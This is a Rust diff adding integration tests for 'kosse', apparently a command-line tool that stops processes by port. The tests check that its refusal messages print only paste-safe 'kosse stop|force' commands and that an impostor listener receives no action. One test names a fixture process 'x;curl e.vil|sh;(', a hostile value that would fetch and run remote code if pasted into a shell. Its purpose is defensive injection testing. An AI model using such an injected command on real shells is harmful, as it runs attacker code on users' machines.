@@ -28,6 +28,7 @@ use kosse_core::{
 };
 use kosse_fixtures::{
     Fixture, FixtureSpec, live_start_time, lsof,
+    protocol::Serve,
     repo::{Sandbox, git, init_repo},
 };
 use support::{NO_CONFIG, Server, eventually};
@@ -61,6 +62,59 @@ fn run(dir: &Path, args: &[&str]) -> Output {
         }
         thread::sleep(Duration::from_millis(200));
     }
+}
+
+/// `kosse <args>` once, without waiting out a rate limit.
+fn once(dir: &Path, args: &[&str]) -> Output {
+    Command::new(env!("CARGO_BIN_EXE_kosse"))
+        .env("KOSSE_CONFIG_DIR", NO_CONFIG)
+        .current_dir(dir)
+        .args(args)
+        .output()
+        .expect("run kosse")
+}
+
+/// Whether `line` is exactly `kosse stop|force <pid>.<start> --ports <p,…>`, optionally with
+/// `--instance-port <n>`: nothing a shell could expand or run besides `kosse`.
+fn is_bare_command(line: &str) -> bool {
+    let digits = |word: &str| !word.is_empty() && word.bytes().all(|b| b.is_ascii_digit());
+    let words: Vec<&str> = line.split(' ').collect();
+    let head = matches!(
+        words.as_slice(),
+        ["kosse", "stop" | "force", identity, "--ports", ports, ..]
+            if identity.split_once('.').is_some_and(|(pid, start)| digits(pid) && digits(start))
+                && ports.split(',').all(digits)
+    );
+    head && match &words[5..] {
+        [] => true,
+        ["--instance-port", port] => digits(port),
+        _ => false,
+    }
+}
+
+/// The indented lines of a refusal: each a `#` comment or a bare command, so pasting them into
+/// sh, bash, zsh or fish runs nothing but `kosse` (checked with `fish -n` too when fish exists).
+/// Returns the commands.
+fn paste_safe_commands(text: &str) -> Vec<String> {
+    let indented: Vec<&str> = text
+        .lines()
+        .filter_map(|line| line.strip_prefix("  "))
+        .collect();
+    let mut commands = Vec::new();
+    for line in &indented {
+        if line.starts_with("# ") {
+            continue;
+        }
+        assert!(is_bare_command(line), "not a bare command: {line:?}");
+        commands.push((*line).to_owned());
+    }
+    if let Ok(fish) = Command::new("fish")
+        .args(["-n", "-c", &indented.join("\n")])
+        .output()
+    {
+        assert!(fish.status.success(), "fish -n: {}", stderr(&fish));
+    }
+    commands
 }
 
 /// `kosse <args> --instance-port <server>`.
@@ -209,7 +263,7 @@ fn a_name_is_refused_with_the_command_that_then_stops_it() {
         );
         assert!(output.stdout.is_empty(), "nothing on stdout: {args:?}");
         assert!(
-            stderr(&output).contains(&format!("\n  {expected}  (")),
+            paste_safe_commands(&stderr(&output)).contains(&expected),
             "{args:?} must print {expected:?}: {}",
             stderr(&output)
         );
@@ -244,6 +298,56 @@ fn a_name_is_refused_with_the_command_that_then_stops_it() {
     let status = fixture.wait(EXIT_WITHIN).expect("fixture exited");
     assert_eq!(status.signal(), Some(15), "SIGTERM");
     assert!(live_ports(&fixture).is_empty(), "its ports are free");
+
+    // "Stop what I left running" is met when it already exited and nobody holds its ports.
+    let again = run_printed(&shop, &format!("{expected} --json"));
+    assert_eq!(again.status.code(), Some(0), "{}", stderr(&again));
+    let answer = answer_of(&again);
+    assert!(answer.not_running, "{answer:?}");
+    assert!(
+        matches!(
+            answer.result,
+            ActionResult::Stale {
+                reason: StaleReason::Exited | StaleReason::IdentityChanged
+            }
+        ),
+        "{answer:?}"
+    );
+}
+
+/// A process name built to run code when pasted (`;`, `|`, and `(` for fish's command
+/// substitution) stays in a comment line; the confirming command holds only numbers.
+#[test]
+fn confirming_commands_are_paste_safe_for_a_hostile_process_name() {
+    let fixture = Fixture::spawn(
+        &FixtureSpec::new()
+            .listen(&[V4])
+            .executable_name("x;curl e.vil|sh;("),
+    )
+    .expect("fixture");
+    let ports = live_ports(&fixture);
+    // Refusals only: this server may signal nothing.
+    let server = Server::start();
+    observed(&server, |service| {
+        service.process.identity == identity(&fixture)
+    });
+    let output = kosse(
+        Path::new(ANYWHERE),
+        &server,
+        &["stop", &ports[0].to_string()],
+    );
+    assert_eq!(output.status.code(), Some(3), "{}", stderr(&output));
+    let text = stderr(&output);
+    assert_eq!(
+        paste_safe_commands(&text),
+        [confirming("stop", &fixture, &server)]
+    );
+    assert!(
+        text.lines()
+            .any(|line| line.starts_with("  # x;curl e.vil|sh;(")),
+        "the name is shown, as a comment: {text}"
+    );
+    assert_untouched(&fixture, &ports);
 }
 
 fn ports_text(ports: &[u16]) -> String {
@@ -314,15 +418,25 @@ fn a_term_ignoring_fixture_is_forced_only_after_a_still_running_stop() {
     ));
     let status = fixture.wait(EXIT_WITHIN).expect("fixture exited");
     assert_eq!(status.signal(), Some(9), "SIGKILL");
+
+    // The offer was used once; the process is gone, which is what force was for.
+    let again = run_printed(dir, &force);
+    assert_eq!(again.status.code(), Some(0), "{}", stderr(&again));
+    assert!(
+        stdout(&again).starts_with("outcome: notRunning\n"),
+        "{}",
+        stdout(&again)
+    );
 }
 
 /// Where commands that need no project scope run.
 const ANYWHERE: &str = "/";
 
-/// A port set that is not every live port, or an identity whose process was replaced, signals
-/// nothing; the refusal names what runs now.
+/// A port set that is not every live port signals nothing and prints the full command, which then
+/// works at once; once another process holds the ports of an exited one, it is named but never
+/// suggested.
 #[test]
-fn a_stale_identity_or_port_set_is_refused_with_the_current_command() {
+fn a_stale_identity_or_port_set_is_refused_without_suggesting_another_process() {
     let mut first =
         Fixture::spawn(&FixtureSpec::new().listen(&[V4]).listen(&[V4])).expect("fixture");
     let ports = live_ports(&first);
@@ -358,33 +472,46 @@ fn a_stale_identity_or_port_set_is_refused_with_the_current_command() {
     );
     assert_untouched(&first, &ports);
 
-    // The test restarts its own fixture on the same port: the old identity is stale.
-    first.stop().expect("cleanup");
+    // The printed command works at once, although the refusal used the instance's
+    // one-action-per-second slot (no retry helper here).
+    let command = format!("{} --json", confirming("stop", &first, &server));
+    let words: Vec<&str> = command.split(' ').skip(1).collect();
+    let confirmed = once(dir, &words);
+    assert_eq!(confirmed.status.code(), Some(0), "{}", stderr(&confirmed));
+    assert!(matches!(
+        answer_of(&confirmed).result,
+        ActionResult::Exited { target, .. } if target == identity(&first)
+    ));
+    first.wait(EXIT_WITHIN).expect("fixture exited");
+
+    // Another process now holds the old port: it is named, but no command is printed for it.
     let second = Fixture::spawn(&FixtureSpec::new().listen(&[V4]).port(ports[0]))
-        .expect("restarted fixture");
+        .expect("successor fixture");
     let second_ports = live_ports(&second);
     observed(&server, |service| {
         service.process.identity == identity(&second)
     });
-    let restarted = kosse(
+    let replaced = kosse(dir, &server, &["stop", &old, "--ports", &joined(&ports)]);
+    assert_eq!(replaced.status.code(), Some(3), "{}", stderr(&replaced));
+    let text = stderr(&replaced);
+    assert!(paste_safe_commands(&text).is_empty(), "{text}");
+    assert!(
+        text.contains("A different process now holds these ports: ")
+            && text.contains(&format!(
+                "{}.{}",
+                second.pid(),
+                second.record().started_at_secs
+            )),
+        "{text}"
+    );
+    let replaced = kosse(
         dir,
         &server,
         &["stop", &old, "--ports", &joined(&ports), "--json"],
     );
-    assert_eq!(restarted.status.code(), Some(3), "{}", stderr(&restarted));
-    let error = error_of(&restarted);
+    let error = error_of(&replaced);
     assert_eq!(error.error, CommandErrorCode::Stale);
-    assert!(
-        matches!(error.result, Some(ActionResult::Stale { .. })),
-        "{error:?}"
-    );
-    assert!(
-        error
-            .confirm
-            .iter()
-            .any(|c| c.command == confirming("stop", &second, &server)),
-        "the process now on the port is named: {error:?}"
-    );
+    assert!(error.confirm.is_empty(), "{error:?}");
     assert_untouched(&second, &second_ports);
 }
 
@@ -503,12 +630,72 @@ fn without_an_instance_nothing_is_signalled() {
     let output = run(&[]);
     assert_eq!(output.status.code(), Some(4), "{}", stderr(&output));
     assert!(
-        stderr(&output).contains(&format!("`kosse serve --no-open --port {free}`")),
+        stderr(&output).contains(&format!("`kosse serve --no-open --port {free} &`")),
         "{}",
         stderr(&output)
     );
     let output = run(&["--json"]);
     assert_eq!(output.status.code(), Some(4));
     assert_eq!(error_of(&output).error, CommandErrorCode::NoInstance);
+    let output = once(
+        Path::new(ANYWHERE),
+        &[
+            "stop",
+            &id,
+            "--ports",
+            &joined(&ports),
+            "--instance-port",
+            "0",
+        ],
+    );
+    assert_eq!(output.status.code(), Some(4), "{}", stderr(&output));
+    assert!(!stderr(&output).contains("--port 0"), "{}", stderr(&output));
     assert_untouched(&fixture, &ports);
+}
+
+/// Something that is not Kossé on `--instance-port` is never sent a session request or an
+/// action, and nothing is signalled.
+#[test]
+fn a_listener_that_is_not_kosse_gets_no_session_or_action() {
+    let target = Fixture::spawn(&FixtureSpec::new().listen(&[V4])).expect("fixture");
+    let target_ports = live_ports(&target);
+    let impostor = Fixture::spawn(
+        &FixtureSpec::new()
+            .listen(&[V4])
+            .serve(Serve::Title)
+            .record(),
+    )
+    .expect("impostor");
+    let port = impostor.record().endpoints[0].port();
+    let id = format!("{}.{}", target.pid(), target.record().started_at_secs);
+    for verb in ["stop", "force"] {
+        let output = once(
+            Path::new(ANYWHERE),
+            &[
+                verb,
+                &id,
+                "--ports",
+                &joined(&target_ports),
+                "--instance-port",
+                &port.to_string(),
+                "--json",
+            ],
+        );
+        assert_eq!(output.status.code(), Some(4), "{}", stderr(&output));
+        assert_eq!(error_of(&output).error, CommandErrorCode::NoInstance);
+    }
+    let received = impostor.received(port);
+    assert!(
+        received
+            .iter()
+            .any(|request| request.starts_with("GET /api/health ")),
+        "the listener was verified, and refused: {received:?}"
+    );
+    assert!(
+        received
+            .iter()
+            .all(|request| !request.contains("/api/session") && !request.starts_with("POST")),
+        "{received:?}"
+    );
+    assert_untouched(&target, &target_ports);
 }
